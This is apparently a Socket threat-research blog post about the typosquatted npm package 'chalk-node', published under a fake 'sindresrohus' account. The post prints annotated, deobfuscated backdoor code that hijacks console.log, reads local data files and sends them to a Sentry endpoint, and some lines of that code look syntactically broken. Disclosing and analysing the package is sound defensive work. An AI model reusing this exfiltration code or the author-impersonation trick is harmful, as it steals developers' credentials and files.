---
title: "Author Typosquatting on npm: Attackers Impersonate Sindre Sorhus with Malicious 'chalk-node' Package"
short_title: "Author Typosquatting on npm: Impersonating Sindre Sorhus"
date: 2024-10-31 12:00:00 +0000
categories: [npm]
tags: [Typosquatting, Obfuscation, Backdoor, Sentry, JavaScript, npm]
canonical_url: https://socket.dev/blog/author-typosquatting-on-npm
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/8bf374505d023b19c6e651bdc1618f7fbc77c62c-745x443.png
  alt: "Author typosquatting on npm impersonating Sindre Sorhus with malicious chalk-node package"
description: "Attackers are impersonating Sindre Sorhus on npm with a fake 'chalk-node' package containing a malicious backdoor to compromise developers' projects."
---

Imitation is not always flattery. Typosquatting, an age-old method of mimicking popular package names, now extends to typosquatting names of the legitimate package authors. A threat actor created the username "**sindresrohus**", slightly altering "**sindresorhus**" by swapping two letters to create an illusion of legitimacy. Using this deceptive identity, the copycat published a backdoored package, [`chalk-node`](https://socket.dev/npm/package/chalk-node), aiming to infiltrate the projects of unsuspecting developers.

Sindre Sorhus ([sindresorhus](https://github.com/sindresorhus)) is a prominent open source developer known for maintaining more than a thousand popular packages, including [`chalk`](https://www.npmjs.com/package/chalk) – a widely-used npm library for styling terminal text. Sindre's extensive contributions to the JavaScript and Node.js communities have earned widespread trust among developers.

Socket's AI Scanner identified supply chain risks associated with the `chalk-node` package. The Socket Threat Research Team performed a deep dive analysis of the typosquatted package and petitioned the package registry to remove the malicious `chalk-node` package, but it is still live on npm at the time of publishing.

Our analysis identified that the `index.esm.js` file included in the malicious package is intentionally obfuscated; it redefines the `console.log` function to read files from the user's system, leveraging Node.js file system modules like `readFileSync`, `existsSync`, and `readdirSync` to access and exfiltrate sensitive information to an external Sentry instance.

## Will the real Sindre Sorhus please stand up? We're gonna have a problem here.

By registering an npm account as **sindresrohus** (note the reversed "o" and "r" letters) and copying the real **sindresorhus'** profile picture, the threat actor aims to exploit the trust placed in the legitimate maintainer. The threat actor published a malicious package named `chalk-node`, typosquatting the real `chalk` package. The attacker even replicated the legitimate package's `README` to further masquerade the malicious package as authentic.

![](https://cdn.sanity.io/images/cgdhsj6q/production/8bf374505d023b19c6e651bdc1618f7fbc77c62c-745x443.png)

## Chalking up malicious intent.

The typosquatted package `chalk-node` has 692 [total](https://npm-stat.com/charts.html?package=chalk-node&from=2021-10-27&to=2024-10-27) downloads unlike the real package, which has 334 million [weekly](https://socket.dev/npm/package/chalk) downloads, being one of the most popular packages in the npm ecosystem. The popularity of `chalk` places it within the upper ranks of npm packages, often featuring in lists of the [top 10](https://gist.github.com/anvaka/8e8fa57c7ee1350e3491) most downloaded or depended-upon packages.

In addition to legitimate `chalk` package style, files and code, the copycat `chalk-node` package buried additional files, such as `[index.esm.js](http://index.esm.js/)`, which Socket's AI Scanner flagged for accessing the file system, and potentially reading sensitive data. We further analyzed `index.esm.js` and assess that it functions as a backdoor, reading files from the user's system and sending sensitive content to an external service without authorization.

![](https://cdn.sanity.io/images/cgdhsj6q/production/b0510852956e81cfd780a242a40bad1cbd1c64d8-732x501.png)

The threat actor obfuscated the `index.esm.js` file, making it difficult to read and understand; however, by analyzing the code's structure and patterns, we can infer its functionality. The code performs actions that compromise data confidentiality. It accesses sensitive information and makes it accessible beyond its intended scope. Specifically, it uses `fs` module functions like `readFileSync`, `existsSync`, and `readdirSync` to access the file system. It constructs file paths dynamically, targeting directories relative to the module's location. The code reads all files in the `data` directory, capturing stored credentials, configuration files, and data dumps. It overrides `console.log` to intercept any output containing a colon (`:`), directly targeting developers who may log sensitive information during debugging or normal operation. The exfiltrated data includes logged objects or messages containing credentials, tokens, URLs, or other sensitive information.

The `index.esm.js` captures sensitive information from the file system and sends it to Sentry using `Sentry.captureMessage`, which could lead to unauthorized data disclosure. The code initializes Sentry with a Data Source Name (DSN), enabling it to send data to a specific Sentry project. While Sentry is a legitimate error-tracking service, misusing it to send unauthorized data constitutes a breach of security and privacy policies.

The obfuscation and silent error handling suggest an intent to hide malicious activities, such as unauthorized data access and exfiltration. Multiple `try` and `catch` blocks with empty `catch` clauses prevent errors from being logged or handled properly.

## Code tells the story.

Below are the `index.esm.js` code snippets with added comments highlighting malicious functionality and intent.

```javascript
// Importing Sentry for error tracking and monitoring
import e from "@sentry/node";

// Importing necessary modules and assigning them to short variables
import { fileURLToPath as t } from "url";
import { dirname as r, join as n } from "path";
import i from "fs"; // 'i' represents the 'fs' (File System) module

// Initializing Sentry with a Data Source Name (DSN)
// Enables sending data to a specific Sentry project
let K = e; // Alias for Sentry module
const W = "captureMessage"; // Method name for sending messages in Sentry
K.init({
  dsn: "hxxps://6a0d63f9f996c35a809c20ff07359934@o4505703178960896.ingest.sentry[.]io/4505703197310976",
  maxValueLength: 1073741824,
  tracesSampleRate: 1,
});

// Defining helper functions to obfuscate method names
const U = "read";
const L = "Sync";
const X = U + "dir" + L; // 'readdirSync' - reads directory contents synchronously
const G = (e) => "exists" + e; // Returns 'existsSync' - checks if a file exists
const V = (e) => e + "File" + L; // Returns 'readFileSync' - reads file contents synchronously

// Function to generate a timestamp string
function Y() {
  var e = new Date();
  return (
    e.getFullYear() +
    `-${String(e.getMonth() + 1).padStart(2, "0")}-${String(e.getDate()).padStart(2, "0")} ` +
    `${String(e.getHours()).padStart(2, "0")}:${String(e.getMinutes()).padStart(2, "0")}:` +
    String(e.getSeconds()).padStart(2, "0")
  );
}

// Function to generate a random string (used as an identifier)
const Z = () => Math.random().toString(36).substring(2);

// Original console.log function preserved
const ee = console.log;

// Overriding the console.log function
console.log = function (...e) {
  try {
    var t, r;
    ee(...e); // Calls the original console.log with all arguments

    // Anonymous function to perform additional operations
    (() => {
      try {
        // Constructing a path to the '../data' directory
        var currentPath = r(t(import.meta.url)); // Current directory of the module
        var dataPath = n(currentPath, (e) => e + e + e)("../"), "data"); // Navigates up three directories to 'data' folder
        var files = i[X](dataPath); // i[X] is 'fs.readdirSync' - reads the 'data' directory

        if (dataPath && dataPath.length > 0) {
          var randomId = Z(); // Random identifier for logging
          var timestamp = Y(); // Current timestamp

          // Iterates over each file in the 'data' directory
          for (let n = 0; n < files.length; n++)
            try {
              var filePath = dataPath + "/" + files[n];
              // Checks if the file exists using 'fs.existsSync'
              if (i[G(L)](filePath)) {
                // Reads the file content using 'fs.readFileSync'
                var content = i[V(U)](filePath, "utf-8");
                // Sends the file content to Sentry using 'captureMessage' (Potential Data Exfiltration)
                J(timestamp + `>>>${randomId}>>>0`, "" + content);
              }
            } catch (e) {
              /* Empty catch block to silently handle errors */
            }
        }
      } catch (e) {
        /* Empty catch block to silently handle errors */
      }
    })();

    // Checks if any of the logged arguments contain a colon ':'
    if ([...e].some((arg) => -1 !== arg.toString().indexOf(":"))) {
      t = Z(); // Generates another random identifier
      r = Y(); // Current timestamp
      // Sends the logged data to Sentry (Potentially sensitive information)
      J(r + `>>>${t}>>>1>>>0`, JSON.stringify({ data: [...e] }));
    }
  } catch (t) {
    // In case of an error, fall back to the original console.log
    ee(...e);
  }
};

// Freezes the console object to prevent further modifications
Object.freeze(console);

// Function to send messages to Sentry
const J = (prefix, message) => {
  try {
    if (-1 !== prefix.indexOf(">>>0")) {
      // Splits the message if it's too long
      var parts = Math.floor(message.length / 7000) + 1;
      for (let i = 1; i <= parts; i++) {
        var part = message.slice((i - 1) * 7000, i * 7000);
        // Sends each part to Sentry
        K[W](`${prefix}>>>${i}>>>` + part);
      }
    } else {
      // Sends the entire message to Sentry
      K[W](prefix + ">>>" + message);
    }
  } catch (e) {
    /* Empty catch block to silently handle errors */
  }
};
```

## Protect yourself and your organizations with Socket's free tools.

Threat actors exploit human error and trust by mimicking and typosquatting trusted authors and packages to infiltrate malicious code into applications. It is crucial to verify package and author names carefully, review third-party code, and use security tools to detect potentially malicious packages.

[Socket's free GitHub app](https://socket.dev/features/github) detects malicious packages and serves as your first line of defense against typosquatting and other supply chain risks like install scripts, telemetry, and known malware. It scans incoming dependencies in real-time with every pull request, instantly alerting developers via a GitHub comment if a potential typosquatted package is detected.

## Enhance security with Socket CLI.

Enhance your security further with the Socket CLI tool, which alerts you to potential typosquatting and other security issues. Its "safe npm" feature proactively shields your machine from bad packages during `npm install`. Socket wraps npm commands, running the real npm install process while analyzing results in the background — even for deeply nested dependencies. Before writing anything to disk, it alerts you to risky packages, giving you the choice to stop the install or proceed.

## Getting started is easy.

Install the Socket CLI:

`npm install -g socket`

Then, prefix npm installs with `socket` to analyze them before installation:

`socket npm install react`

## Secure your workflow today.

[Socket for GitHub](https://socket.dev/features/github) and Socket CLI integrate seamlessly into your workflow, are free to use, and can save your app or organization from the disastrous consequences of supply chain attacks using typosquatting. Install them today to prevent risky dependencies from landing in your applications.
